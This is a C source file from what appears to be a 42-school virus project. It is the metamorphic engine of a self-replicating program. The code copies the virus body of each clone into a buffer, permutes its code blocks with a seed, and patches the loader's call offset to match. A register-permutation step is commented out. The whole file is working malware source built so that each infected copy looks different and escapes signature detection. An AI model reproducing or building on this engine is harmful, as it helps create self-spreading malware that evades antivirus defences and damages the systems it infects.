/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph_self.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
/*   Updated: 2021/06/15 20:16:06 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/mman.h>

#include "accessors.h"
#include "polymorphism.h"
#include "errors.h"
#include "loader.h"
#include "virus.h"

#include "syscall.h"
#include "log.h"
#include "write_jump.h"

/*
** metamorph_self is a metamorphic generator for the virus and loader.
**   It applies intruction and register permutations on the clone's loader code
**   And block permutations on the clone's virus code
**
**   Some parts of the loader can't be reg-permutated because of
**   syscall calling conventions.
*/

static bool	setup_input_buffer(struct safe_ptr *input, void *clone_virus, \
			size_t virus_size)
{
	*input = (struct safe_ptr){
		.ptr  = sys_mmap(0, virus_size, PROT_READ | PROT_WRITE, // TODO
			MAP_ANON | MAP_PRIVATE, -1, 0),
		.size = virus_size
	};

	if (input->ptr == NULL) return errors(ERR_SYS, _ERR_MMAP_FAILED);

	memcpy(input->ptr, clone_virus, virus_size);

	return true;
}

static bool	setup_output_buffer(struct safe_ptr *output, void *clone_virus, \
			size_t clone_size, size_t loader_size)
{
	*output = (struct safe_ptr){
		.ptr  = clone_virus,
		.size = clone_size - loader_size
	};

	return true;
}

static bool	get_input_virus_address(struct safe_ptr clone, size_t loader_off, \
			void *clone_virus, void *input_virus, size_t *input_virus_address)
{
	size_t	dist_loader_entry_vircall = call_virus - loader_entry;
	size_t	off_vircall = loader_off + dist_loader_entry_vircall;

	void	*clone_call_code = safe(clone, off_vircall, 5);
	if (clone_call_code == NULL) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	int32_t	*clone_call_arg = (clone_call_code + 1);
	void	*new_clone_virus = (void*)((ssize_t)(clone_call_code + 5) + *clone_call_arg);

	*input_virus_address = (size_t)input_virus + (new_clone_virus - clone_virus);

	return true;
}

static bool	adapt_virus_call_in_loader(struct safe_ptr clone_ref, size_t loader_off, \
			int32_t virus_func_shift)
{
	size_t	dist_loader_entry_vircall = call_virus - loader_entry;
	size_t	off_vircall = loader_off + dist_loader_entry_vircall;

	void	*call_code = safe(clone_ref, off_vircall, JUMP32_INST_SIZE);
	if (call_code == NULL) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	int32_t	*call_arg = (call_code + 1);
	*call_arg += virus_func_shift;

	return true;
}

bool		metamorph_self(struct safe_ptr clone, size_t *virus_size, \
			size_t loader_off, uint64_t seed)
{
	// get clone loader pointer
	size_t	loader_size      = (size_t)loader_exit - (size_t)loader_entry;
	size_t	loader_entry_off = loader_off;
	void	*clone_loader    = safe(clone, loader_entry_off, loader_size);

	// get clone virus pointer
	size_t	loader_virus_dist = (size_t)virus - (size_t)loader_entry;
	size_t	virus_entry_off   = loader_off + loader_virus_dist;
	void	*clone_virus      = safe(clone, virus_entry_off, *virus_size);

	if (!clone_loader || !clone_virus)
		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	struct safe_ptr	input_buffer;
	struct safe_ptr	output_buffer;
	size_t		input_virus_address;
	int32_t		virus_func_shift = 0;

	if (!setup_input_buffer(&input_buffer, clone_virus, *virus_size)
	||  !setup_output_buffer(&output_buffer, clone_virus, clone.size, loader_size)
	||  !get_input_virus_address(clone, loader_off, clone_virus, input_buffer.ptr, &input_virus_address))
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);

	// metamorph self and client
	if (!true
	// || !permutate_registers(clone_loader, seed, loader_size)
	|| !permutate_blocks(input_buffer, output_buffer, virus_size, input_virus_address, &virus_func_shift, seed)
	|| !adapt_virus_call_in_loader(clone, loader_off, virus_func_shift)
	|| !free_accessor(&input_buffer)
	|| !true)
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);

	return true;
}
